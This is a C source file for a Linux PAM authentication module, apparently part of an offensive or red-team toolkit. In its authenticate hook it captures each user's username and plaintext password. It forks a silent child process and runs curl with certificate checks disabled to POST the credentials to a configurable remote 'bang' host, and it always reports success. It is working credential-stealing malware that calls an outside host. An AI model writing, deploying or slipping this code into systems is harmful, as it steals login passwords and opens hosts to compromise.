#include <security/pam_appl.h> // yum install pam-devel
#include <security/pam_ext.h>
#include <security/pam_modules.h>

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <syslog.h>
#include <unistd.h>

#ifdef DEBUG
    #define DEBUG_LOG(...) syslog(LOG_INFO, __VA_ARGS__)
#else
    #define DEBUG_LOG(...)
#endif

static const char c_JsonTemplate[] =
    "{"
        "\"auth_token\": \"%s\","
        "\"domain\": \"%s\","
        "\"username\": \"%s\","
        "\"password\": \"%s\""
    "}";
static const char c_BangEndpointFmt[] = "https://%s/bang/log/";

// stampable values - configured via web interface or helper script
static const char c_BangHttpsHostname[128] = "EVERYBODYGETUP";
static const char c_BangAuthToken[] = "00000000-0000-0000-0000-000000000000";

PAM_EXTERN
int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_LOG("pam_sm_setcred called");
    return PAM_SUCCESS;
}

PAM_EXTERN
int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_LOG("pam_sm_acct_mgmt called");
    return PAM_SUCCESS;
}

PAM_EXTERN
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_LOG("pam_sm_authenticate called");

    const char *username = NULL;
    const char *password = NULL;

    // user should not be prompted here if the module is configured with use_first_pass
    if (PAM_SUCCESS != pam_get_user(pamh, &username, "Username: "))
    {
        DEBUG_LOG("pam_get_user failed!");
        return PAM_PERM_DENIED;
    }
    if (PAM_SUCCESS != pam_get_authtok(pamh, PAM_AUTHTOK, &password, "Password: "))
    {
        DEBUG_LOG("pam_get_authtok failed!");
        return PAM_PERM_DENIED;
    }

    if (0 == fork())
    {
        char json_data[256] = {0};
        char bang_endpoint[128] = {0};
        
        // redirecting output to /dev/null
        int null = open("/dev/null", O_WRONLY);
        dup2(null, STDOUT_FILENO);
        dup2(null, STDERR_FILENO);

        // TODO: some linux hosts are joined to windows domains - resolve?
        snprintf(json_data, sizeof(json_data) - 1, c_JsonTemplate, c_BangAuthToken, "domain.todo", username, password);
        DEBUG_LOG("%s", json_data);

        snprintf(bang_endpoint, sizeof(bang_endpoint) - 1, c_BangEndpointFmt, c_BangHttpsHostname);
        
        // fire-and-forget
        execlp("curl", "-X", "POST", "-d", json_data, "-k", bang_endpoint, NULL);
    }

    return PAM_SUCCESS;
}